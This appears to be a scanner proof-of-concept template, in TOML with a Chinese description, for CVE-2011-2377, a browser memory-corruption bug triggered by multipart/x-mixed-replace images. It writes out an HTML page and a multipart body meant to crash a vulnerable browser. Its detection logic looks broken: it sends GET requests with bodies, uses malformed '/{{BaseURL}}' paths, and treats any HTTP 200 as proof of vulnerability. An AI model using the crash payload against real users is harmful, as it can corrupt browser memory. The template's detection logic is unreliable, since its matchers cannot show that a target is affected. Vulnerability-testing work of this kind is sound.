[info]
author = "AVE"
description = "检测目标浏览器是否受 multipart/x-mixed-replace 图片内存破坏漏洞影响，通过构造包含多个指向 multipart/x-mixed-replace 资源的 img 标签的 HTML 页面触发 ycc_rgb_convert 崩溃"
id = "POC-AVE-2011-0093"
name = "CVE-2011-2377 PoC"
severity = "high"
tags = ["cve-2011-2377"]
vuln_id = [
    "CVE-2011-2377",
    "AVE-2011-0093",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cve-2011-2377-test.html"
protocol = "http"

[poc.requests.body]
content = """
<html><body>
<h2>CVE-2011-2377 Test</h2>
<p>If the browser crashes or displays garbled content, it may be vulnerable.</p>
<img src="/multipart-test?n=1">
<img src="/multipart-test?n=2">
<img src="/multipart-test?n=3">
<img src="/multipart-test?n=4">
<img src="/multipart-test?n=5">
</body></html>"""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/multipart-test"
protocol = "http"

[poc.requests.body]
content = """
--testboundary
Content-Type: image/jpeg

--testboundary--
"""
type = "raw"

[poc.requests.headers]
Content-Type = "multipart/x-mixed-replace; boundary=--testboundary"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
